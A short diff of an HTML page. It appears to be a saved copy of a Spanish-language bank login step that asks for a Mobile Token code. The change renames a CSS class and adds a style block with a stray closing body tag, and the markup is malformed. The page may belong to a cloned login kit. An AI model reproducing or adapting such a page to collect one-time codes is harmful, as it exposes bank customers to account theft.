@@ -1046,7 +1046,17 @@
     width: 60% !important;
 }" _ngcontent-c29="" class="wizard-step-content-title">
 										<span _ngcontent-c29="" >Es hora de usar su dispositivo de seguridad Mobile Token</span>
-										<span _ngcontent-c37="" class="subotica-description-text">Ingrese el código que aparece en la app</span>
+										<span _ngcontent-c37="" class="pop">Ingrese el código que aparece en la app</span>
+
+										    <style>
+
+
+.pop {
+    font-family: sans-serif;
+    font-size: 12px;
+}
+    </style>
+</body>
 									</div>  </center>
 									<icb-login-step-user _ngcontent-c29="" _nghost-c35=""><div  class="wizardAutoHeightModeX ng-pristine ng-invalid ng-touched">
     <div _ngcontent-c35="" class="subotica">
